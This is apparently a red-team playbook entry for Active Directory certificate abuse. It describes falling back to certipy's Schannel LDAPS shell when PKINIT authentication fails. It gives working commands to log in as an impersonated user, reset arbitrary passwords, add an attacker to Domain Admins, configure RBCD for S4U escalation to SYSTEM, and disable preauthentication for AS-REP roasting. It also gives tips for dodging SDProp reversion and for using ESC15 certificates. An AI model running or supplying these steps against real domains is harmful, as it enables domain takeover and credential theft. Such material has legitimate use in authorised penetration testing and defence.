# `certipy auth -ldap-shell` — Universal PKINIT-Failure Fallback

## When this applies

- You have a valid client certificate (`.pfx`) but `certipy auth -pfx <file>.pfx -dc-ip <IP>` fails.
- Goal: bypass the broken PKINIT path by using Schannel (LDAPS with client-cert auth) — a different auth mechanism that ignores PKINIT-specific issues.

## Technique

Schannel (LDAPS TLS client auth) binds purely by UPN SAN, ignores the SID extension, and doesn't require PKINIT to be active. `certipy auth -ldap-shell` opens an interactive LDAP shell as the cert's UPN — full DC-side write permissions for any operation that account is entitled to.

## Steps

```bash
# When `certipy auth -pfx <file>.pfx -dc-ip <IP>` fails for any reason — not just
# SID mismatch — Schannel LDAPS-with-client-cert is the reliable fallback. Symptoms
# that all map to the same fix:
#   KDC_ERR_PADATA_TYPE_NOSUPP        — PKINIT package not enabled on this DC
#   KDC_ERR_CERTIFICATE_MISMATCH      — strong-binding SID enforcement (May 2022 patch)
#   KDC_ERR_INCONSISTENT_KEY_PURPOSE  — cert EKU not Client Auth-capable
#   KDC_ERR_CLIENT_NOT_TRUSTED        — DC's NTAuth store doesn't include this CA
#   ASN1 / IO timeouts during AS-REQ  — DC PKINIT module disabled or NTLM-only
# Drop the PKINIT step and use Schannel instead — Schannel (LDAPS TLS client auth)
# binds purely by UPN SAN, ignores the SID extension, and doesn't require PKINIT
# to be active. You get an interactive LDAP shell as the cert's UPN:
certipy auth -pfx admin.pfx -ldap-shell
# In the LDAP shell:
> change_password <target> 'NewP@ssw0rd!'        # password reset for any target
> add_user_to_group <attacker> 'Domain Admins'   # grant group membership
> set_rbcd <victim_machine> <attacker_machine>   # set msDS-AllowedToActOnBehalfOf
> set_dontreqpreauth <user> true                 # DONT_REQ_PREAUTH → AS-REP roast
> get_user_groups <user>                         # enumeration
# After change_password / group add: PtP/PtH the new credential into WinRM/SMB.
# After set_rbcd: classic S4U2self+S4U2proxy → SYSTEM on the victim machine.

# Original SID-mismatch case (kept here as one specific failure mode of the above):
# When a cert has a UPN SAN for a different user but embeds the requesting user's SID
# in the NTDS CA Security Extension (OID 1.3.6.1.4.1.311.25.2):
#   PKINIT: KDC_ERR_CERTIFICATE_MISMATCH — KDC checks SID even with StrongCertificateBindingEnforcement=0
#   Schannel: IGNORES the SID extension, authenticates by UPN SAN alone
# Exploit:
#   certipy auth -pfx admin.pfx -dc-ip DC_IP  # → KDC_ERR_CERTIFICATE_MISMATCH
#   certipy auth -pfx admin.pfx -ldap-shell    # → Schannel → authenticated as target UPN
```

## Verifying success

- `certipy auth -ldap-shell` drops you to a `>` prompt as the cert's UPN.
- `get_user_groups <self>` confirms membership matches the impersonated principal.

## Common pitfalls

- Schannel requires LDAPS (TCP 636) reachable from the attacker. If the DC has no LDAPS configured or it's firewalled, Schannel fails too — at that point pivot to a fully different primitive (RBCD, Shadow Credentials).
- **Server Authentication-only EKU still works** when the cert ALSO has a Microsoft Application Policies extension (OID `1.3.6.1.4.1.311.21.10`) containing Client Auth (`1.3.6.1.5.5.7.3.2`). This is the standard ESC15 output. Earlier guidance that "Server Authentication alone fails Schannel" was wrong — what actually fails is a cert with serverAuth EKU AND no client-auth-capable Application Policies. AD's Schannel mapping accepts the App Policies as evidence of intent.
- `add_user_to_group` against AdminSDHolder-protected groups (Domain Admins) gets reverted within 60 minutes by SDProp — use the window quickly. Workaround: add to `Administrators` (BUILTIN) instead, which grants the same effective DC rights and isn't AdminSDHolder-protected.
- The shell's `add_user_to_group` parser splits on whitespace, so `Domain Admins` (two-word group) raises "too many values to unpack". Use a single-word group like `Administrators` or pre-create a custom group.
- **macOS OpenSSL 3.6 + SHA1-signed CA chain** breaks the TLS handshake with `CA_MD_TOO_WEAK`. Fix: edit `ldap3/core/tls.py::Tls.wrap_socket` so `ssl_context.set_ciphers('ALL:@SECLEVEL=0')` runs **before** `ssl_context.load_cert_chain(...)`. Without that order, the SHA1 client cert load itself fails the policy check.
- **AD does NOT enable SASL/EXTERNAL on plain LDAP (port 389).** Certipy's schannel path requires LDAPS:636. Plain LDAP returns rc=7 `authMethodNotSupported` and anonymous bind with `whoAmI = None`.

## Tools

- certipy (`auth -ldap-shell`)
